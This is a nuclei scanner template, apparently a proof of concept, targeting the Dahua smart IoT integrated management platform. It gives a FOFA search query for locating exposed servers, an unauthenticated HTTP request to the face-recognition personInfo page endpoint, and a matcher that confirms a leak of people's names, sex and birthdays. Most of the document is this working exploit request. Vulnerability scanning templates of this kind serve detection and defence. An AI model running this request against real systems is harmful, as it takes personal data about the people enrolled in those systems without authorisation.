# Add your nuclei formatted PoC!
id: dahua-znwl-personInfo-infoleak
 
info:
  name: 大华-智能物联综合管理平台-page-信息泄露
  author: rain
  severity: high
  metadata:
    fofa-query: body="*客户端会小于800*" || body="/static/fontshd/font-hd.css"
http:
  - raw:
      - |
        GET /evo-apigw/evo-face/personInfo/page?pageSize=10 HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
        Accept-Encoding: gzip
        
 
 
    matchers:
      - type: dsl
        dsl:
          - 'status_code==200 && contains_all(body,"name","sex","sexStr","birthday")'
